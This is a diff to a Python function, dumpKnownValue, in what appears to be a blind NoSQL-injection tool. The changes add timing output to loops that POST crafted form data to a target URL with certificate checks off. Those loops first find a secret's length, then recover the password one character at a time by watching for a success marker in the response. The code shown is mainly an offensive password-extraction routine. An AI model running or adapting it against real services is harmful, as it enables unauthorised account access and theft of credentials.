@@ -207,6 +207,8 @@ def iterateParam(form_data, val):
                 form_data[element] = val
 
 def dumpKnownValue(nsi, form_data, password):
+    start_time_length = time.time()
+    total_time_length = 0
     # count length
     for c in range(0, 9999999):
         # for element in form_data:
@@ -216,10 +218,16 @@ def dumpKnownValue(nsi, form_data, password):
         r = requests.post(nsi.url, data=form_data, verify=False)
 
         if nsi.successIdentifier in r.text:
+            end_time = time.time()
+            time_taken = end_time - start_time_length
             print("Found length : %s" % (c))
             length = c
+            total_time_length += time_taken
             break
+    print(colored(f"Time taken length for {length}: {total_time_length}", "yellow", attrs=["blink"]))
 
+    start_time_char = time.time()
+    total_time_char = 0
     for x in range(length):
         for c in string.printable:
             if c not in ["*", "+", ".", "?", "|", "'", '"', "&", " "]:
@@ -231,8 +239,13 @@ def dumpKnownValue(nsi, form_data, password):
                 r = requests.post(nsi.url, data=form_data, verify=False)
 
                 if nsi.successIdentifier in r.text:
+                    end_time = time.time()
+                    time_taken = end_time - start_time_char
                     print("Result : %s" % (password + c), end="\r")
                     password += c
+                    print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))
+                    total_time_char += time_taken
+                    start_time_char = time.time()
                     break
     print("Result : %s" % (password))
 
